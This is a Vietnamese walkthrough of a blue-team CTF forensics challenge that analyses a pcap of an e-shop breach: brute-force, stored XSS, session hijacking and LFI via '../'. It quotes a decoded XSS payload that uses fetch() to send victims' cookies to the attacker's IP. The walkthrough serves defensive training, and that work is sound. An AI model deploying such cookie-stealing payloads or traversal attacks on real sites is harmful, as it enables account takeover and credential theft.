## kịch bản: ShopSphere bị các héc cơ lỏ đăng nhập vào các tài khoản quản trị trùng với thời điểm khách hàng khiếu nại nhiều lần

https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/

Q1: dựa trên những request nhiều bất thường thì xác định được ip của héc cơ (bruteforce)

<img width="2002" height="295" alt="image" src="https://github.com/user-attachments/assets/97bd2228-09df-4541-af7c-97d8fd8b9e28" />

Q2: để xem hắn sài tool gì thì vào tcp stream để xem phần header của packet

<img width="306" height="105" alt="image" src="https://github.com/user-attachments/assets/e45e5c9f-bc26-4bb2-9518-86d59660c8dc" />

Q3: dùng filter để tìm đoạn XSS đó nhanh hơn đọc chay nho `ip.addr == 111.224.180.128 && http.request.method == POST`

<img width="1302" height="26" alt="image" src="https://github.com/user-attachments/assets/4fc433e5-63e0-416b-b090-80c8f13d0542" />

decode ra là `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` -> gửi request đến server của héc cơ, dữ liệu chính là cookie của nạn nhân 

Q4: file của héc cơ tên là `reviews.php`. Lướt một hồi trong file pcap này sẽ thấy ip của nạn nhân `135.143.142.5`. Nạn nhân đã truy cập vào log_viewer.php

<img width="1553" height="905" alt="image" src="https://github.com/user-attachments/assets/0ef78b42-c258-4998-89bd-dded1f27a9bd" />

Q5: khi mà nạn nhân truy cập vào thì bị dính file mã độc thực thi, ăn cắp cookie gửi về héc cơ, héc cơ lấy cookie đấy đăng nhập vào account quản trị. Dưới 2 hình này, đầu tiên của nạn nhân, thứ hai của héc cơ -> cookie đều là PHPSESSID=lqkctf24s9h9lg67teu8uevn3q

<img width="1345" height="235" alt="image" src="https://github.com/user-attachments/assets/8d629bee-aeda-422b-9828-11b581ec22bd" />

<img width="1043" height="1059" alt="image" src="https://github.com/user-attachments/assets/67f8fe4d-5112-41ad-a173-8fb993448862" />

Q6: lướt một hồi coi packet nữa, thì héc cơ chủ động LFI để đọc file chứa user:password, file `log_viewer.php` chính là file chứa mã độc 

<img width="718" height="37" alt="image" src="https://github.com/user-attachments/assets/fb7f856a-d00c-4b37-b2cc-cdbb920da331" />

Q7: cùng với hình trên thì héc cơ sài ../ để mà LFI lên

